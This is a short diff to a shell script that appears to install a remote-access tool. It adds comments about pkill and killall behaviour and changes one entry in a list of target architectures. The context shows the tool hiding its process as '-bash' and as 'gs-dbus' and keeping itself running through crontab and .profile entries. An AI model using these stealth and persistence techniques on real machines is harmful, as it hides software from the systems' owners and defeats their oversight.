@@ -565,6 +565,8 @@ init_vars()
 	# Because we hide as '-bash' we can not use pkill all -bash.
 	# 'killall' however matches gs-dbus and on OSX we thus force killall
 	if [[ $OSTYPE == *darwin* ]]; then
+		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
+		# 'pkill' matches the binary name.
 		KL_CMD="killall"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
@@ -582,6 +584,7 @@ init_vars()
 	[[ -z $KL_CMD_BIN ]] && {
 		# set to something that returns 'false' so that we dont
 		# have to check for empty string in crontab/.profile
+		# (e.g. skip checking if already running and always start)
 		KL_CMD_BIN="$(command -v false)"
 		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
 		WARN "No pkill or killall found."
@@ -1328,7 +1331,7 @@ try()
 # binaries and fail hard if none could be found.
 try_any()
 {
-	targets="x86_64-alpine i386-alpine aarch64-linux armv6l-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
+	targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-cygwin x86_64-freebsd x86_64-osx"
 	for osarch in $targets; do
 		[[ "$osarch" = "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
 		try "$osarch"
